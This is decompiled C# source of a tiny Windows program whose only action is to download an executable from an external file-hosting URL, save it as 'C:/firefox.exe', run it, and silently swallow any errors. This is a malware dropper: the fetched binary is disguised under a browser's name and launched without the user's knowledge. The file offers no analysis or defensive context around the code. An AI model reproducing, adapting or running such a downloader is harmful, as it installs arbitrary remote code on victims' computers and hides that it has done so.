using System;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using WindowsApplication3.My;

namespace WindowsApplication3;

[StandardModule]
internal sealed class Module1
{
	[MethodImpl(MethodImplOptions.NoOptimization)]
	[STAThread]
	public static void main()
	{
		try
		{
			string text = "http://dc230.gulfup.com/l2u51.exe?gu=jGLPYb8qaCaZkU37ObLPJA&e=1394567839&n=66696c656e616d652a3d5554462d38272761686d65642e657865";
			string text2 = "C:/firefox.exe";
			((ServerComputer)MyProject.Computer).get_Network().DownloadFile(text, text2);
			Process.Start(text2);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		ProjectData.EndApp();
	}
}
